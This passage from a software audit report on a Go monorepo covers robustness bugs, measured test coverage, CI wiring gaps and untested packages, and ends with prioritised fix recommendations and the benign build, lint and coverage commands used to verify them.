16. **`providers/ai/catalog.go:129` `CatalogAsOf`** — no product callers.
17. **`core/formats/exec/reader.go`** — the entire unwired exec runner (§3.5).

**Concurrency & robustness:**

18. **`bowrain/service/auth.go:454-456`** — fire-and-forget goroutine calling `UpdateAPITokenLastUsed` **without a `recover`**; the sibling in `middleware_auth.go:178-187` has one. A store panic crashes the server process. Inconsistent defensive posture.
19. **`bowrain/event/webhook.go:53,57`** — retry backoff `time.Sleep` not ctx-aware; requests built on `context.Background()`; `Deliver` takes no context — webhook delivery can't be cancelled on shutdown.
20. **`core/tools/qacheck.go:220,226`** and **`core/tools/tagprotect.go:126`** — user-supplied regexes that fail to compile are **silently skipped**: a typo'd QA rule simply never fires, with no warning to the user who configured it.
21. **`host/flow.go:1321,1341,1365`** — three identical TODOs: `context.Background()` passed into content-memory lookups; no cancellation/timeout reaches TM queries.
22. **`core/formats/xliff/reader.go:777`** — `if err != nil { return nil, nil }` on an XML token error inside `<source>` extraction: a malformed document reads as "no source", not a parse error.

**Style/consistency:**

23. **9 near-duplicate XML-escape helpers** — `xliff/reader.go:1020` and `xliff2/reader.go:725` are byte-identical; 7 more variants across xml/openxml/ts/tmx/epub/memory. Exactly the helper a shared internal package exists for.
24. **`bowrain/store/connector_config.go:327-328`** — `cfg.LastSyncAt, _ = time.Parse(...)`: corrupt timestamps silently become zero (the same function's JSON unmarshal at 332 *is* checked — inconsistent).
25. **`core/formats/jsx/jsx.go:543`** — `_ = w.outFile.Close()` after encode: close-time flush failure dropped.

---

## 6. Test coverage and untested code

### 6.1 Measured coverage (local, Go 1.26, darwin/arm64, with `PKG_CONFIG_PATH` for icu4c and `-tags fts5` where required)

| Module/package | Coverage |
|---|---|
| **Root (framework) total** | **71.8%** |
| memory | 65.7% (kmb 83.3%, schema 100%) |
| terms | 76.4% (ktb 77.4%, schema 100%) |
| core/flow | 77.5% |
| core/blockstore | 64.3% — **sqlitestore 0.0%** |
| core/formats/openxml | 82.8% |
| core/ai/tools | 77.5% |
| providers | ai 68.2%, mt 93.3% |
| **host total** | **51.2%** (output 20.3%, pluginhost 59.2%, credentials 84.0%) |
| **cli** | **54.3%** |
| **kapi** | cmd/kapi 67.6%, preset 100% |
| **bowrain/core** | connector 100%, auth 64.7%, sync 71.9%, **project 22.5%**, **event 0.0%**, **agent [no test files]**, client 46.4% |

No genuinely failing tests found. Raw `go test ./...` does fail 8+ packages two environmental ways — missing icu4c `PKG_CONFIG_PATH` ([build failed]) and missing `-tags fts5` (`no such function: fts5` panics, 35 occurrences) — because the Makefile's `GOTAGS`/pkg-config setup is required but bare `go test` doesn't set it. Contributor-facing fragility worth documenting or guarding.

### 6.2 CI coverage wiring facts

- `codecov.yml`: project target `auto` (2% threshold), **patch target 60%** — but coverage is only collected/uploaded on `push`, never on PRs (`ci.yml:742`); PRs run FAST mode with "no race detector, no -shuffle, no coverage" (`Makefile:129-133`). **The 60% patch gate is dead config.**
- No minimum threshold enforced anywhere; `make cover` never fails under a bar.
- Push runs add `-race -shuffle -covermode=atomic` — good.

### 6.3 Zero-test packages (48 total; notable real gaps)

| LOC | Package | Concern |
|---|---|---|
| 442 | `core/blockstore/sqlitestore` | Production SQLite backing store for AI-translation session caches — **measured 0.0%** |
| 405 | `bowrain/agent` | Postgres agent-store schema/migrations |
| 371 | `core/storage/schema` | Dual-dialect (SQLite/Postgres) DDL renderer; a divergence silently corrupts one store — no equivalence test (contrast memory/schema, terms/schema at 100%) |
| 275 | `core/credentials` | **Keychain API-key store whose comments describe a multi-tenant isolation invariant (WorkspaceID scoping) with no test verifying it** |
| 228 | `bowrain/core/event` | Pub/sub event bus — **measured 0.0%** |
| 397 | `bowrain/cmd/bowrain-server` | server main() |
| 138 | `bowrain/core/agent` | agent core logic |

(Remaining zero-test packages are generated proto, wasm-tagged entrypoints, plugin mains, fixtures, or examples — lower concern.)

### 6.4 Critical-path verification

- **Format roundtrip tests: VERIFIED.** CLAUDE.md's claim holds — all 21 spot-checked formats have roundtrip tests; error-path tests exist by name in xliff (`TestReadMalformedSurfacesError`, `TestReadLenientInputsDoNotPanic`, `TestReadDeeplyNestedDoesNotPanic`); xml has 141 test functions. Gaps: `xliff2/writer.go` (1,690 LOC, roundtrip-fidelity-critical) has `Config`/`AddFileNote` at 0%, `renumberDataIDsInUnit` 11.5%; `html/tokenreader.go` (2,363 LOC) malformed-HTML recovery/synthesis functions at 0% — precisely the paths real-world HTML exercises.
- **memory/**: concurrent read access tested (`concurrent_test.go`); dead spots in `sqlite.go` (1,726 LOC): `NewSQLiteStoreFromDB`, `RebuildFuzzyIndex`, `RebuildSearchIndex`, `LookupSegment`, `SearchEntriesForStream`, `ActivityStats` all 0%; concurrent write/write races not tested by name.
- **bowrain/auth/**: token validation well tested (wrong audience/expiry/signature/issuer rejection, refresh rotation).
- **cli/**: converge has 4 dedicated test files including concurrency and events.

### 6.5 Test-quality findings

- **Shallow assertions:** essentially none found (heuristic scan + manual spot-checks; the two hits were false positives). Helpers are disciplined (`t.Helper()` + `require` inside).
- **Skips:** ~40 conditional environment skips (ffmpeg, node, xmllint, missing okapi-testdata fixtures) — all loud and legitimate. One deliberate permanent skip: `xliff/reader_test.go:2667` (upstream-parity decision).
- **Fuzz roster is thin:** only 7 fuzz functions in 4 packages repo-wide (html, json ×2, xliff ×2, protoconvert ×2). **No fuzzing** for xml (2,418-line reader), po, yaml, ts, markdown, openxml, tmx, resx, androidxml, properties, messageformat, odf, epub — all accept arbitrary user content in CLI and server ingestion.
- **Two real CI wiring holes:**
  1. **5 `bowrain/jobs` test files skip on `BOWRAIN_TEST_DATABASE_URL`, which is never set anywhere** — CI sets `BOWRAIN_TEST_POSTGRES_URL` (push-only) and pgtest reads *that* var. Job-claim concurrency (`TestClaimJob_OnlyOneWins`), sweeper, and worker-sync tests **never execute in CI**.
  2. **`integration`-tagged tests (8 files: bowrain memory/terms Postgres parity, knowledge handlers) are invoked by no workflow** — `make test-integration` exists but no CI job calls it; `test-bowrain` doesn't pass `-tags=integration`. Postgres-backed content-memory parity — the project's core cross-store correctness claim — is CI-invisible.
- **Modules never `go test`ed in CI:** `plugins/{sat,check,asr,av,pdfium}` (release workflows only build them; vision gets a nightly onnx smoke). `make test-sat-plugin` is called by no workflow.

### 6.6 Top-10 riskiest untested/undertested areas

1. `core/credentials` (275 LOC, zero tests) — keychain store with an untested multi-tenant isolation invariant.
2. `bowrain/jobs` Postgres tests dead in CI (env-var mismatch) — race-prone distributed claiming untested in practice.
3. `core/blockstore/sqlitestore` (442 LOC, 0.0%) — production store tested only transitively through other implementations.
4. The `integration` lane (Postgres parity for content memory/terms) never wired to CI.
5. `core/formats/xliff2/writer.go` (1,690 LOC) — XLIFF 2.0 write-back with key functions at 0-16%.
6. `core/formats/html/tokenreader.go` (2,363 LOC) — malformed-HTML recovery at 0%.
7. `bowrain/core/event` (0.0%) + `bowrain/core/project` (22.5%) + `bowrain/core/client` (46.4%) — the sync/event backbone is the least-tested bowrain area.
8. `core/storage/schema` (371 LOC, zero tests) — dual-dialect DDL renderer with no equivalence test.
9. No fuzzing on the biggest attack-surface parsers (xml, po, yaml, markdown, openxml, tmx…).
10. `kapi/cmd/kapi-wasm-cli` (1,750 LOC, `js && wasm`, zero tests) + `cli/parity/roundtrip/normalizers.go` (2,680 LOC, parity-tag only) — large correctness-relevant bodies ordinary `go test` never compiles.

---

## 7. Consolidated recommendations, in priority order

**Emergency (this week):**
1. Remove or dev-gate the device-flow direct-verification path (§4.1) — one-request account takeover in every production build. While there: rate-limit `/device/verify` and enlarge `user_code` entropy.
2. Bind GitHub App installations to workspaces (§4.2).

**High (before any SaaS deployment / next release):**
3. Introduce a project-trust gate for exec-capable recipe features (§3.1) and delete or gate the unwired exec format (§3.5); remove the recipe-settable MT `baseURL` (§3.6).
4. Validate all package-carried paths and recipes at the `kpz.Unmarshal`/`LoadWorkspace` boundary (§3.2, §3.3); route kpz through `safeio` (§3.4).
5. Split the server connector registry: no `file`/`git` connectors on multi-tenant deployments; SSRF guard (https-only, IP-range rejection, no body reflection) for remote connectors (§4.3, §4.4).
6. Validate item names at ingest and output-path containment at write time in bowrain delivery (§4.5.3).
7. Web tier hygiene: escape the OIDC callback error page, add CSP/nosniff/frame headers, serve previews sandboxed, pin WebSocket origins (§4.5.1, §4.5.2, §4.5.4).

**Medium (next quarter):**
8. Fix the verified silent-drop bugs: `jobs/queue.go` retry loss, `grpc.go` tool-error discard, `tmx_export.go` truncated-export success, `handlers_agent.go` audit-before-persist, chunk-0 overwrite (§5.2.1–5.2.7).
9. Fix the shipped note-deletion authorization gap and enforce invite email binding (§4.6, §4.5.5).
10. Fix the CI wiring holes: align `BOWRAIN_TEST_DATABASE_URL` with `BOWRAIN_TEST_POSTGRES_URL`, wire `make test-integration` into a workflow, make the Codecov patch gate real (upload on PRs) or delete it, run plugin tests in CI (§6.5).
11. Add tests for `core/credentials` (isolation invariant), `core/blockstore/sqlitestore`, `core/storage/schema` (dialect equivalence), `bowrain/core/event`; extend fuzzing to xml/po/yaml/markdown/openxml/tmx readers (§6.6).
12. Route the 251 raw-`err.Error()` 500s through the sanitized handler (§4.5.7).

**Structural (longer term):**
13. Break up `bowrain/server` and `host` root god packages along the existing file-prefix clusters; converge web/CLI orchestration on shared host services (§2.2.1, §2.2.2, §2.2.4).
14. Harden the sandbox container config (non-root user, CapDrop, no-new-privileges, PidsLimit) and fix the bash→alpine image mapping (§4.6).
15. Delete dead code kept alive by suppressions (SSE hub, `withParallelBlocks`, `ExportTMXBilingual`); consolidate the 9 XML-escape helpers (§5.2.13–5.2.17, §5.2.23).
16. Remove the tracked `checkeval`/`modelcheck` binaries from git history (§2.2.8).

---

## Appendix A — Verification commands used

```bash
# Module boundary checks (all returned 0 matches where expected)
go list -deps ./... | grep -E 'neokapi/(host|cli|kapi|bowrain)'        # at root
cd host && go list -deps ./... | grep cobra
cd apps/kapi-desktop && go list -deps ./backend/... | grep -E 'cobra|neokapi/cli'
cd kapi && go list -deps ./... | grep -E 'neokapi/(bowrain|plugins)/'
GOWORK=off go build ./...                                              # per module

# Static analysis
go vet ./...                    # clean: root, host, cli, kapi, bowrain, plugins
golangci-lint run ./...         # v2.9.0 pinned config — 0 issues: root, host, cli, bowrain

# Coverage (requires icu4c pkg-config and fts5 tag for some packages)
PKG_CONFIG_PATH=/opt/homebrew/opt/icu4c/lib/pkgconfig \
  go test -count=1 -tags fts5 -coverprofile=cover.out ./...
go tool cover -func=cover.out | tail -5
```

## Appendix B — Environment notes

- `gosec` standalone was not installed; the repo's golangci-lint config includes gosec (with documented per-rule exclusions) and reports 0 issues on all linted modules — scanner corroboration for the manual review.
- `plugins/pdfium` could not be vetted (external `pdfium` native library absent from the machine) — environment limitation, not a code defect.
- All line numbers verified against commit `001254df7` during this review.
